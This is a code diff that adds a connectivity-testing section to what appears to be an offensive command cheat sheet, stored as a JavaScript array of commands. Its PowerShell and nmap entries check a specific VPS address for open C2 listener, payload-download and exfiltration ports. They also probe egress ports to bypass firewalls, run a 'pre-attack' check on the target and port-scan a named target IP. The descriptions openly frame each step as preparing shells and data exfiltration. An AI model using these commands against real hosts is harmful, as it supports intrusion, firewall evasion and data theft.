@@ -5191,6 +5191,122 @@ const COMMANDS = [
   },
 
   // ═══════════════════════════════════════════════════════════════
+  // CONNECTIVITY TESTING - Test-Connection, port checks, egress
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "Test-Connection to VPS (ICMP Ping)",
+    desc: "PowerShell ICMP ping to VPS. Shows RTT per hop. Use -Quiet for True/False. Fails if ICMP blocked.",
+    code: "Test-Connection 168.144.166.97 -Count 4",
+    tags: ["ps", "recon", "vps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Test-Connection Quiet (Script-Friendly)",
+    desc: "Returns True if host responds, False if unreachable. Ideal for if-checks in scripts.",
+    code: "if (Test-Connection 168.144.166.97 -Count 1 -Quiet) { 'VPS REACHABLE' } else { 'VPS UNREACHABLE' }",
+    tags: ["ps", "recon", "vps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Test-NetConnection VPS C2 Port 4444",
+    desc: "TCP port test to C2 listener. TcpTestSucceeded=True = C2 will accept shells. Shows latency.",
+    code: "Test-NetConnection -ComputerName 168.144.166.97 -Port 4444",
+    tags: ["ps", "recon", "vps", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Test-NetConnection VPS HTTP 8889",
+    desc: "TCP test to beacon/tools HTTP server. Verify file downloads will work before deploying payload.",
+    code: "Test-NetConnection -ComputerName 168.144.166.97 -Port 8889",
+    tags: ["ps", "recon", "vps", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Test-NetConnection VPS Exfil 8083",
+    desc: "TCP test to catch_all.py exfil receiver. Verify POST exfil will succeed.",
+    code: "Test-NetConnection -ComputerName 168.144.166.97 -Port 8083",
+    tags: ["ps", "recon", "vps", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Sweep All VPS Ports (Full Check)",
+    desc: "Tests all critical VPS service ports at once. Shows which are reachable from target network. Run before deploying.",
+    code: "@(4444,5555,6666,8080,8083,8888,8889,9999) | ForEach-Object {\n  $r = Test-NetConnection 168.144.166.97 -Port $_ -WarningAction SilentlyContinue\n  [PSCustomObject]@{ Port=$_; Open=$r.TcpTestSucceeded }\n} | Format-Table -AutoSize",
+    tags: ["ps", "recon", "vps", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Quick TCP Port Check (No Warning Spam)",
+    desc: "Fast port check using raw socket. No verbose warnings. Returns OPEN/CLOSED in ~1 second.",
+    code: "function Test-Port($h,$p){try{$t=New-Object Net.Sockets.TcpClient;$t.ConnectAsync($h,$p).Wait(1500);$r=$t.Connected;$t.Close();if($r){'OPEN'}else{'CLOSED'}}catch{'CLOSED'}}\nTest-Port '168.144.166.97' 4444\nTest-Port '168.144.166.97' 8889",
+    tags: ["ps", "recon", "vps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find Egress Ports (Bypass Firewall)",
+    desc: "Probe common outbound ports to find which ones bypass corporate/cloud firewall. Pick open port for C2.",
+    code: "@(22,53,80,443,4444,5555,8080,8083,8443,8889) | ForEach-Object {\n  $port = $_\n  try {\n    $t = New-Object Net.Sockets.TcpClient\n    $r = $t.ConnectAsync('168.144.166.97', $port).Wait(1500)\n    $status = if($t.Connected) {'OPEN'} else {'CLOSED'}\n    $t.Close()\n  } catch { $status = 'CLOSED' }\n  \"Port $($port): $status\"\n}",
+    tags: ["ps", "recon", "firewall"],
+    accent: "#3498db"
+  },
+  {
+    title: "Continuous C2 Port Monitor",
+    desc: "Loop every 10s checking port 4444. Shows timestamp + status. Run while starting VPS services to know when ready.",
+    code: "while($true) {\n  $r = Test-NetConnection 168.144.166.97 -Port 4444 -WarningAction SilentlyContinue\n  $s = if($r.TcpTestSucceeded) { '[OPEN]' } else { '[CLOSED]' }\n  Write-Host \"$(Get-Date -f 'HH:mm:ss') 168.144.166.97:4444 $s\"\n  Start-Sleep 10\n}",
+    tags: ["ps", "recon", "vps", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Pre-Attack Connectivity Check",
+    desc: "Run on TARGET before deploying. Checks VPS reachability, C2 port, HTTP, exfil. All must be OPEN.",
+    code: "$vps = '168.144.166.97'\nWrite-Host 'ICMP:' (Test-Connection $vps -Count 1 -Quiet)\n@(4444,8889,8083) | % {\n  $r = Test-NetConnection $vps -Port $_ -WarningAction SilentlyContinue\n  Write-Host \"Port $_: $(if($r.TcpTestSucceeded){'OPEN'}else{'CLOSED'})\"\n}",
+    tags: ["ps", "recon", "vps", "c2", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Check Ports from VPS Side",
+    desc: "Run on VPS to self-verify all listeners are up. Should show 4444, 8083, 8889 in LISTEN state.",
+    code: "ss -tlnp | grep -E '4444|5555|8080|8083|8889' | sort",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Test-Connection Multiple Targets",
+    desc: "Ping multiple hosts at once. Good for confirming VPS and target are both reachable.",
+    code: "Test-Connection -ComputerName 168.144.166.97,4.200.69.210 -Count 2 | Select-Object Address,ResponseTime,StatusCode",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Traceroute to VPS",
+    desc: "Shows network hops to VPS. Find where traffic is being filtered. Slow hop = bottleneck.",
+    code: "# CMD:\ntracert 168.144.166.97\n\n# PowerShell:\nTest-NetConnection 168.144.166.97 -TraceRoute",
+    tags: ["ps", "recon", "vps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "SSH Connectivity Test to VPS",
+    desc: "TCP test to VPS SSH port 22. Useful before setting up reverse SSH tunnels.",
+    code: "Test-NetConnection 168.144.166.97 -Port 22",
+    tags: ["ps", "recon", "vps", "ssh"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "VPS: Nmap Target Port Scan",
+    desc: "Full port scan of target from VPS. -sV detects service versions. Run before attacking.",
+    code: "nmap -sV -p 22,80,135,443,445,3389,5985 4.200.69.210",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Quick Nmap Top Ports",
+    desc: "Fast scan of 100 most common ports. Good first recon before targeted scans.",
+    code: "nmap -F --open 4.200.69.210",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+
+  // ═══════════════════════════════════════════════════════════════
   // PAYLOAD GENERATION
   // ═══════════════════════════════════════════════════════════════
   {
